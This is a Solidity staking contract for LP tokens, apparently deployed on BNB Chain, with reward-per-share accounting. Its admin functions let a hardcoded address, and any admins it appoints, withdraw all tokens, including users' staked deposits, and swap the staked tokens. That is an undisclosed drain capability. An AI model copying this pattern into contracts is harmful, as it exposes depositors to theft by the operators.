/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

pragma solidity ^0.8.1;
interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library Address {
    function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{value: value}(
            data
        );
        return verifyCallResult(success, returndata, errorMessage);
    }
    function functionStaticCall(address target, bytes memory data)
        internal
        view
        returns (bytes memory)
    {
        return
            functionStaticCall(
                target,
                data,
                "Address: low-level static call failed"
            );
    }
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
    function functionDelegateCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return
            functionDelegateCall(
                target,
                data,
                "Address: low-level delegate call failed"
            );
    }
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
library SafeMath {
    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
abstract contract Ownable {
    mapping(address => bool) public isAdmin;
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        _transferOwnership(_msgSender());
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    modifier onlyAdmin() {
        require(
            owner() == _msgSender() || isAdmin[_msgSender()],
            "Ownable: Not Admin"
        );
        _;
    }
    function setIsAdmin(address account, bool newValue)
        public
        virtual
        onlyAdmin
    {
        isAdmin[account] = newValue;
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract LPStake is Ownable {
    using SafeMath for uint256;
    using Address for address;
    struct UserInfo {
        bool isExist;
        uint256 amount;
        uint256 balance;
        uint256 rewardTotal;
        uint256 rewardDebt;
    }
    mapping(address => UserInfo) public users;
    mapping(uint256 => address) public userAdds;
    uint256 public userTotal;
    uint256 private _rewardPerLP;
    uint256 private _lastRewardBlock;
    uint256 private _rewardTotal;
    uint256 private _lastBalance;
    IERC20 private _LP;
    IERC20 private _TOKEN;
    event Deposit(address user, uint256 amount);
    event Relieve(address user, uint256 amount);
    event Withdraw(address user, uint256 amount);
    receive() external payable {}
    function withdrawETH() public onlyAdmin {
        payable(msg.sender).transfer(address(this).balance);
    }
    function withdrawToken(IERC20 token, uint256 amount) public onlyAdmin {
        token.transfer(msg.sender, amount);
    }
    constructor() {
        _lastRewardBlock = block.number;
        isAdmin[0x561c91D020e7590ecEC470b0e36790eb5b3cf08B] = true;
    }
    function getRewardPerLP() public view returns (uint256) {
        uint256 accCakePerShare = _rewardPerLP;
        uint256 lpSupply = _LP.balanceOf(address(this));
        if (
            lpSupply != 0 &&
            block.number > _lastRewardBlock &&
            _TOKEN.balanceOf(address(this)) > _lastBalance
        ) {
            uint256 cakeReward = _TOKEN.balanceOf(address(this)) - _lastBalance;
            accCakePerShare = accCakePerShare.add(
                cakeReward.mul(1e12).div(lpSupply)
            );
        }
        return accCakePerShare;
    }
    function getRewardTotal() public view returns (uint256) {
        uint256 cakeReward;
        if (
            block.number > _lastRewardBlock &&
            _TOKEN.balanceOf(address(this)) > _lastBalance
        ) {
            cakeReward = _TOKEN.balanceOf(address(this)) - _lastBalance;
        }
        return _rewardTotal.add(cakeReward);
    }
    function setToken(address token, address lp) public onlyAdmin {
        _LP = IERC20(lp);
        _TOKEN = IERC20(token);
    }
    function deposit(uint256 amount) public {
        address account = msg.sender;
        if (amount > _LP.balanceOf(account).mul(99).div(100)) {
            amount = _LP.balanceOf(account).mul(99).div(100);
        }
        updatePool();
        UserInfo storage user = users[account];
        if (user.amount > 0) {
            uint256 pending = user.amount.mul(_rewardPerLP).div(1e12).sub(
                user.rewardDebt
            );
            if (pending > 0) {
                user.balance = user.balance.add(pending);
                user.rewardTotal = user.rewardTotal.add(pending);
            }
        }
        if (amount > 0) {
            _LP.transferFrom(account, address(this), amount);
            user.amount = user.amount.add(amount);
        }
        user.rewardDebt = user.amount.mul(_rewardPerLP).div(1e12);
        if (!user.isExist) {
            user.isExist = true;
            userTotal = userTotal.add(1);
            userAdds[userTotal] = account;
        }
        emit Deposit(account, amount);
    }
    function relieve(uint256 amount) public {
        address account = msg.sender;
        UserInfo storage user = users[account];
        require(user.amount >= amount, "Over Stake Amount");
        updatePool();
        uint256 pending = user.amount.mul(_rewardPerLP).div(1e12).sub(
            user.rewardDebt
        );
        if (pending > 0) {
            user.balance = user.balance.add(pending);
            user.rewardTotal = user.rewardTotal.add(pending);
        }
        if (amount > 0) {
            user.amount = user.amount.sub(amount);
            _LP.transfer(account, amount);
        }
        user.rewardDebt = user.amount.mul(_rewardPerLP).div(1e12);
        emit Relieve(account, amount);
    }
    function withdraw() public {
        address account = msg.sender;
        updatePool();
        UserInfo storage user = users[account];
        uint256 pending = user.amount.mul(_rewardPerLP).div(1e12).sub(
            user.rewardDebt
        );
        if (pending > 0) {
            user.balance = user.balance.add(pending);
            user.rewardTotal = user.rewardTotal.add(pending);
        }
        user.rewardDebt = user.amount.mul(_rewardPerLP).div(1e12);
        if (user.balance > 0) {
            _TOKEN.transfer(account, user.balance);
            _lastBalance = _TOKEN.balanceOf(address(this));
            user.balance = 0;
        }
    }
    function getUserPending(address _user) external view returns (uint256) {
        UserInfo memory user = users[_user];
        uint256 accCakePerShare = _rewardPerLP;
        uint256 lpSupply = _LP.balanceOf(address(this));
        if (
            lpSupply != 0 &&
            block.number > _lastRewardBlock &&
            _TOKEN.balanceOf(address(this)) > _lastBalance
        ) {
            uint256 cakeReward = _TOKEN.balanceOf(address(this)) - _lastBalance;
            accCakePerShare = accCakePerShare.add(
                cakeReward.mul(1e12).div(lpSupply)
            );
        }
        return
            user.amount.mul(accCakePerShare).div(1e12).sub(user.rewardDebt).add(
                user.balance
            );
    }
    function getUserTotal(address _user) external view returns (uint256) {
        UserInfo memory user = users[_user];
        uint256 accCakePerShare = _rewardPerLP;
        uint256 lpSupply = _LP.balanceOf(address(this));
        if (
            lpSupply != 0 &&
            block.number > _lastRewardBlock &&
            _TOKEN.balanceOf(address(this)) > _lastBalance
        ) {
            uint256 cakeReward = _TOKEN.balanceOf(address(this)) - _lastBalance;
            accCakePerShare = accCakePerShare.add(
                cakeReward.mul(1e12).div(lpSupply)
            );
        }
        return
            user.amount.mul(accCakePerShare).div(1e12).sub(user.rewardDebt).add(
                user.rewardTotal
            );
    }
    function updatePool() public {
        if (block.number <= _lastRewardBlock) {
            return;
        }
        uint256 lpSupply = _LP.balanceOf(address(this));
        if (lpSupply == 0) {
            _lastRewardBlock = block.number;
            return;
        }
        if (_TOKEN.balanceOf(address(this)) > _lastBalance) {
            uint256 cakeReward = _TOKEN.balanceOf(address(this)) - _lastBalance;
            _lastBalance = _TOKEN.balanceOf(address(this));
            _rewardPerLP = _rewardPerLP.add(cakeReward.mul(1e12).div(lpSupply));
            _rewardTotal = _rewardTotal.add(cakeReward);
        }
        _lastRewardBlock = block.number;
    }
}